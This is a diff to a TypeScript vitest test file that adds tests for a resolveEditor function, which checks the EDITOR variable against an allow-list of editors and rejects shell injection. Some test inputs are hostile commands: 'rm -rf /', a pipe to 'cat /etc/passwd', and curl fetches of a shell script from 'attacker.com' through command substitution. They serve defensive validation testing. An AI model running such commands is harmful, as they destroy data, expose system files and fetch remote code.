@@ -1,5 +1,5 @@
-import { describe, it, expect } from "vitest";
-import { buildSafeEnv, spawnAsync } from "./process";
+import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
+import { buildSafeEnv, resolveEditor, spawnAsync } from "./process";
 
 describe("buildSafeEnv", () => {
 	it("includes whitelisted env vars", () => {
@@ -24,6 +24,82 @@ describe("buildSafeEnv", () => {
 	it("overrides can override whitelisted keys", () => {
 		const env = buildSafeEnv({ PATH: "/custom/path" });
 		expect(env.PATH).toBe("/custom/path");
+	});
+});
+
+describe("resolveEditor", () => {
+	let savedEditor: string | undefined;
+	let warnSpy: ReturnType<typeof vi.spyOn>;
+
+	beforeEach(() => {
+		savedEditor = process.env.EDITOR;
+		warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+	});
+
+	afterEach(() => {
+		if (savedEditor === undefined) {
+			delete process.env.EDITOR;
+		} else {
+			process.env.EDITOR = savedEditor;
+		}
+		warnSpy.mockRestore();
+	});
+
+	it("returns 'vi' when EDITOR is unset", () => {
+		delete process.env.EDITOR;
+		expect(resolveEditor()).toBe("vi");
+	});
+
+	it("returns valid editor name", () => {
+		process.env.EDITOR = "vim";
+		expect(resolveEditor()).toBe("vim");
+		expect(warnSpy).not.toHaveBeenCalled();
+	});
+
+	it("extracts basename from absolute path", () => {
+		process.env.EDITOR = "/usr/bin/vim";
+		expect(resolveEditor()).toBe("vim");
+		expect(warnSpy).not.toHaveBeenCalled();
+	});
+
+	it("falls back to vi for unknown editor", () => {
+		process.env.EDITOR = "rm -rf /";
+		expect(resolveEditor()).toBe("vi");
+		expect(warnSpy).toHaveBeenCalled();
+	});
+
+	it("rejects shell metacharacters", () => {
+		process.env.EDITOR = "vim; malicious";
+		expect(resolveEditor()).toBe("vi");
+		expect(warnSpy).toHaveBeenCalledWith(
+			expect.stringContaining("shell metacharacters"),
+		);
+	});
+
+	it("rejects pipe injection", () => {
+		process.env.EDITOR = "vim | cat /etc/passwd";
+		expect(resolveEditor()).toBe("vi");
+		expect(warnSpy).toHaveBeenCalled();
+	});
+
+	it("rejects backtick injection", () => {
+		process.env.EDITOR = "`curl attacker.com/shell.sh`";
+		expect(resolveEditor()).toBe("vi");
+		expect(warnSpy).toHaveBeenCalled();
+	});
+
+	it("rejects command substitution", () => {
+		process.env.EDITOR = "$(curl attacker.com/shell.sh)";
+		expect(resolveEditor()).toBe("vi");
+		expect(warnSpy).toHaveBeenCalled();
+	});
+
+	it("accepts all allowed editors", () => {
+		const allowed = ["vi", "vim", "nvim", "nano", "emacs", "code", "subl", "mate", "micro", "hx", "helix", "kate", "gedit"];
+		for (const editor of allowed) {
+			process.env.EDITOR = editor;
+			expect(resolveEditor()).toBe(editor);
+		}
 	});
 });
 
